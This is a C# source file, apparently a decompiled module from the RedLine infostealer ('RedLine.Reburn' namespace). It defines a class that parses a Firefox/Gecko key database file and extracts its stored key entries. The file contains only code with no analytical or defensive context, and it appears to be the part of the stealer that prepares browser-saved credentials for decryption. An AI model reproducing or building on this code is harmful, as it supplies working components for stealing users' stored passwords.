using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace RedLine.Reburn.Data.Browsers.Gecko;

public class GeckoDatabase
{
	public List<KeyValuePair<string, string>> Keys { get; }

	public GeckoDatabase(string FileName)
	{
		List<byte> list = new List<byte>();
		Keys = new List<KeyValuePair<string, string>>();
		list.AddRange(File.ReadAllBytes(FileName));
		string value = BitConverter.ToString(Calculate(list.ToArray(), 0, 4, littleEndian: false)).Replace("-", "");
		BitConverter.ToString(Calculate(list.ToArray(), 4, 4, littleEndian: false)).Replace("-", "");
		int num = BitConverter.ToInt32(Calculate(list.ToArray(), 12, 4, littleEndian: true), 0);
		if (string.IsNullOrEmpty(value))
		{
			return;
		}
		int num2 = int.Parse(BitConverter.ToString(Calculate(list.ToArray(), 56, 4, littleEndian: false)).Replace("-", ""));
		int num3 = 1;
		while (Keys.Count < num2)
		{
			string[] array = new string[(num2 - Keys.Count) * 2];
			for (int i = 0; i < (num2 - Keys.Count) * 2; i++)
			{
				array[i] = BitConverter.ToString(Calculate(list.ToArray(), num * num3 + 2 + i * 2, 2, littleEndian: true)).Replace("-", "");
			}
			Array.Sort(array);
			for (int j = 0; j < array.Length; j += 2)
			{
				int num4 = Convert.ToInt32(array[j], 16) + num * num3;
				int num5 = Convert.ToInt32(array[j + 1], 16) + num * num3;
				int num6 = ((j + 2 >= array.Length) ? (num + num * num3) : (Convert.ToInt32(array[j + 2], 16) + num * num3));
				string @string = Encoding.ASCII.GetString(Calculate(list.ToArray(), num5, num6 - num5, littleEndian: false));
				string value2 = BitConverter.ToString(Calculate(list.ToArray(), num4, num5 - num4, littleEndian: false));
				if (!string.IsNullOrEmpty(@string))
				{
					Keys.Add(new KeyValuePair<string, string>(@string, value2));
				}
			}
			num3++;
		}
	}

	private byte[] Calculate(byte[] source, int start, int length, bool littleEndian)
	{
		byte[] array = new byte[length];
		int num = 0;
		for (int i = start; i < start + length; i++)
		{
			array[num] = source[i];
			num++;
		}
		if (littleEndian)
		{
			Array.Reverse((Array)array);
		}
		return array;
	}
}
